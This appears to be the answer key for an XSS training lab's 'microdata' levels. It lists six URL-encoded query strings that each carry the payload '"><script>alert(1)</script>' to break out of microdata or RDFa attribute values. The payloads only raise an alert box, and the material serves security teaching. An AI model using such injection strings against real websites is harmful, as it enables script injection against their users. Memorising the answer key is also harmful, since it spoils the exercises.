# microdata — solutions

Reflections inside microdata/RDFa attributes — break out of double-quoted attribute.

### microdata-level1

`/microdata/level1/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `itemtype="..."` attribute breakout

### microdata-level2

`/microdata/level2/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `itemprop="..."` attribute breakout

### microdata-level3

`/microdata/level3/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<meta itemprop content="...">` attribute breakout

### microdata-level4

`/microdata/level4/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: `<link itemprop href="...">` attribute breakout

### microdata-level5

`/microdata/level5/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: RDFa `property` `content="..."` attribute breakout

### microdata-level6

`/microdata/level6/?query=%22%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `"><script>alert(1)</script>`
- context: RDFa `typeof="..."` attribute breakout
